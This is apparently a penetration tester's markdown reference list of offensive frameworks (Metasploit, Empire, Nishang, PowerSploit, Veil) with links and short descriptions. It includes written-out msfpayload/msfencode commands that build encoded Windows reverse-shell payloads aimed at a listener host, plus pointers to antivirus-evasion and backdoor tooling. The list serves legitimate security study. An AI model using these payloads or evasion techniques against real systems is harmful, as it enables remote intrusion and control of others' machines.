##Frameworks and Methodologies of all kinds!




PTES
OSSTMM


Metasploit Framework

[What is Metasploit?](https://www.youtube.com/watch?v=TCPyoWHy4eA)

[Metasploit - github.io](https://metasploit.github.io/)
* It is the official “reference” page for the metasploit framework

[Facts and Myths about AV Evasion with the Metasploit Framework](http://schierlm.users.sourceforge.net/avevasion.html)

[MSF/Meterpreter cmd reference](http://hacking-class.blogspot.com/2011/08/metasploit-cheat-sheet-metasploit.html)

[Empire - Powershell Post-Exploitation Agent](http://www.powershellempire.com/)
* Empire is a pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.



http://it-ovid.blogspot.com/2012/02/metasploit-and-meterpreter.html

Metasploit Framework - Payload Encoding
List all available payloads and search for windows reverse tcp shellsmsfpayload -l | grep windows | grep shell | grep reverse | tcp

List available encoders 
msfencode -l 

Reverse self-contained (not staged) command shell: 341 bytes 
msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c

msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c

Windows Command Shell, reverse Ordinal TCP Stager (Np NX or Win7) 
Use msf multi/handler to listen and upload remainder of the shellcode (stage 2)

msfpayload windows/shell/reverse_ord_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c
Generic Syntax

msfpayload <payload> <options> <output>| ./msfencode -e <encoder> -b <bad bytes> -t <output format>

Contributing to Metasploit


[Writing an Exploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit)
[Writing an Exploit for Metasploit by Corelan](https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/)
[Writing an Auxiliary module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-auxiliary-module)

[Writing a Post-Exploitation module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module)
[Style tips for writing a Metasploit module](https://github.com/rapid7/metasploit-framework/wiki/Style-Tips)



[Metasploit Framework Module Github](https://github.com/rapid7/metasploit-framework/tree/master/modules)
* Easiest way of seeing the most current listing of any modules.
* All are Github pages for the Metasploit project


*  [Metasploit Framework Wiki](https://github.com/rapid7/metasploit-framework/wiki)
*  [Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary)
*  [Auxiliary Module Fuzzers](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/fuzzers)
*  [Denial-of-Service Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/dos)
*  [Auxiliary Gather Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/gather)
*  [Auxiliary Scanner Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner)
*  [Server Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/server)
*  [Auxiliary Spoofing Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/spoof)
*  [Auxiliary VOIP Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/voip)
*  [Encoder Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/encoders)
*  [Payloads - Singles](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles)
*  [Payloads - Singles - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/windows)
*  [Payloads - Singles - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/linux/x86)
*  [Payloads - Stagers](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers)
*  [Payloads - Stagers - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/windows)
*  [Payloads - Stagers - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/linux/x86)
*  [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
*  [Exploits - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
*  [Exploits - Linux])https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux)
*  [Exploits - Multi-Platform](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi)
*  [Post-Exploitation Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post)
*  [Post-Exploitation Windows Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/windows)
*  [Post-Exploitation Linux Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/linux)








###Nishang Framework

Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and during Penetraion Tests. Nishang is useful during various phases of a penetration test and is most powerful for post exploitation usage. It was made by https://twitter.com/nikhil_mitt


###PowerSploit Framework

Github

Windows exploitation framework composed of Powershell modules






###Veil Framework
[Veil-Evasion](https://www.github.com/Veil-Framework/Veil-Evasion/) * Veil-Evasion is a tool to generate payload executables that bypass common antivirus solutions. 
[Veil-Ordnance](https://github.com/Veil-Framework/Veil-Ordnance)
* Veil-Ordnance is a tool that can be used to quickly generate valid stager shellcode.


[Veil-Framework](https://github.com/Veil-Framework/Veil)
* 


[Veil-Catapult](https://www.veil-framework.com/category/veil-catapult/)
* Veil-Catapult is a payload delivery tool that integrates with Veil-Evasion for payload generation. 
* [Github](https://github.com/Veil-Framework/Veil-Catapult/)



[Veil-Pillage](https://github.com/Veil-Framework/Veil-Pillage)
Veil-Pillage is a modular post-exploitation framework that integrates with Veil-Evasion for payload generation.

[Veil Power-View[](https://github.com/Veil-Framework/Veil-PowerView/)
* Veil-PowerView is a powershell tool to gain network situational awareness on Windows domains. Veil-PowerView’s code is located at 
[DomainTrustExplorer](https://github.com/sixdub/DomainTrustExplorer)
* Python script for analyis of the "Trust.csv" file generated by Veil PowerView. Provides graph based analysis and output. The graph output will represent access direction (opposite of trust direction) 

Veil Tutorials:
* [Framework Usage Tutorial](https://www.veil-framework.com/veil-tutorial/)
* [Payload Creation Tutorial](https://www.veil-framework.com/tutorial-veil-payload-development/)
* [Customizing backdoors with Veil](https://www.veil-framework.com/how-to-customize-backdoor-factory-payloads-within-veil/)
* [Creating a windows payload](https://www.youtube.com/watch?v=v1OXNP_bl8U)

More videos: 
https://www.veil-framework.com/guidesvideos/



Talks on Veil 

[Adventures in Asymmetric Warfare by Will Schroeder](https://www.youtube.com/watch?v=53qQfCkVM_o)